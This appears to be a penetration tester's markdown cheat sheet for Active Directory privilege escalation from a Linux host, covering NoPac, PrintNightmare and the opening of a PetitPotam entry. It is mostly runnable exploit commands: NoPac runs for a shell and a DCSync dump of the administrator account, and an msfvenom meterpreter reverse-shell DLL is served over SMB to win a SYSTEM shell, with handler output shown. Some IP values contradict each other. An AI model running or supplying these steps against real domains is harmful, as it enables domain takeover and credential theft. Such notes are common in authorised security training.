# From a Linux attack host
_______________________________________________________________________________________
## NoPac (SamAccountName Spoofing)
This vuln allow us for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.
Exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller : https://github.com/Ridter/noPac
### Install Impacket
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install 
```
### Cloning the NoPac Exploit Repo
```bash
git clone https://github.com/Ridter/noPac.git
```
### Scanning for NoPac
```bash
sudo python3 scanner.py mydomin.local/username:password -dc-ip 192.168.0.1 -use-ldap
```
### Running NoPac & Getting a Shell
could be "noisy" or may be blocked by AV or EDR.
```bash
sudo python3 noPac.py MYDOMAIN.LOCAL/username:password -dc-ip 192.168.0.1  -dc-host PC'S-NAME -shell --impersonate administrator -use-ldap
``` 
the TGT is saved in the directory on the attack host: administrator_PC'S-NAME.MYDOMAIN.local.ccache
We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. 
We can also use the tool with the -dump flag to perform a DCSync using secretsdump.py.

### Using noPac to DCSync the Built-in Administrator Account
```bash
sudo python3 noPac.py MYDOMAIN.LOCAL/username:password -dc-ip 192.168.0.1  -dc-host APC'S-NAME --impersonate administrator -use-ldap -dump -just-dc-user MYDOMAIN/administrator
```
### Windows Defender & SMBEXEC.py
If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail.
_______________________________________________________________________________________
## PrintNightmare
allow for privilege escalation and remote code execution.
### Cloning the Exploit
```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
# For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's 
```
### Install cube0x0's Version of Impacket
```bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

### Enumerating for MS-RPRN
We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.
```bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```
### Generating a DLL Payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=8080 -f dll > backupscript.dll
# We will then host this payload in an SMB share we create on our attack host using smbserver.py.
```
### Creating a Share with smbserver.py
```bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```
### Configuring & Starting MSF multi/handler
```bash
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 192.168.0.1
LHOST => 10.10.10.100
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 192.168.0.100:8080 
```
### Running the Exploit
```bash
sudo python3 CVE-2021-1675.py mydomain.local/username:password@192.168.0.100 '\\192.168.0.1\CompData\backupscript.dll'
```
### Getting the SYSTEM Shell
```bash
(Meterpreter 1)(C:\Windows\system32) > shell
```
_______________________________________________________________________________________
## PetitPotam (MS-EFSRPC)
PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoftâ€™s Encrypting File System Remote Protocol (MS-EFSRPC). 



